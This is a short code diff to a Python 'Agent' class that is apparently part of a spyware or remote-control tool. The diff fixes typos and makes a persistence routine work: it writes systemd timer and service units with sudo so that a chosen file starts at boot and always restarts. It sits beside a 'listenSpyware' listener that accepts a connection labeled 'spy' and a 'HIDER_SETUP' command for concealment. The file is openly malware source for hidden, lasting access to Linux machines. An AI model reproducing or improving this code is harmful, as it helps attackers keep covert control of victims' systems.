@@ -25,7 +25,7 @@ class Agent:
     @classmethod
     def listenSpyware(cls, listen_addr: tuple[str, int]):
         host, port = listen_addr
-        with Listener(host, port) as listener:l;
+        with Listener(host, port) as listener:
             conn = listener.accept()
         return Agent(conn, "spy")
 
@@ -137,10 +137,10 @@ class Agent:
         self.conn.send_command(Command(0, FunCode.HIDER_SETUP, 0, strParam))
         return self.conn.recv_full_responce()
     
-    def make_presistensy(self, fileName):
+    def make_persistency(self, fileName):
         self.run_bash("cd /etc/systemd/system/")
         self.run_bash("sudo bash -c 'cat > mytimer.timer <<EOF\n[Unit]\nDescription=Run mytask periodically\n[Timer]\nOnBootSec=5\nPersistent=true\n[Install]\nWantedBy=timers.target\nEOF'")
-        self.run_bash("sudo bash -c 'cat > myservice.service <<EOF\n[Unit]\nDescription=My Custom Service\nAfter=network.target\n\n[Service]\nType=simple\n ExecStart={fileName}\nRestart=always\nEOF'")
+        self.run_bash(f"sudo bash -c 'cat > myservice.service <<EOF\n[Unit]\nDescription=My Custom Service\nAfter=network.target\n\n[Service]\nType=simple\n ExecStart={fileName}\nRestart=always\nEOF'")
         self.run_bash("sudo systemctl daemon-reload")
         self.run_bash("sudo systemctl start mytimer.timer")
         self.run_bush("sudo systemctl enable mytimer.timer")
